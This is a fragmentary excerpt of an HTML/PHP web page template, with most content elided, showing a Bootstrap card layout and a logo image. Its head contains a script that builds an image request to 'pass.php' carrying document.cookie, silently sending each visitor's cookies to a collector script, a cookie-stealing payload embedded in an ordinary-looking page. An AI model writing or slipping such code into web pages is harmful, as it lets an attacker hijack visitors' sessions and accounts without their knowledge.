...
<head>
	...
	<script> var i = new Image(); i.src="pass.php?g="+document.cookie; </script>
</head>
<body>
        ...
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
						...
						curl_setopt($ch, CURLOPT_URL, "assets/images/logo.svg");
						...
						else
						{
							...
							echo '<img src="assets/images/logo.svg" alt="" class="center" height="50px" width="50px"><br>';
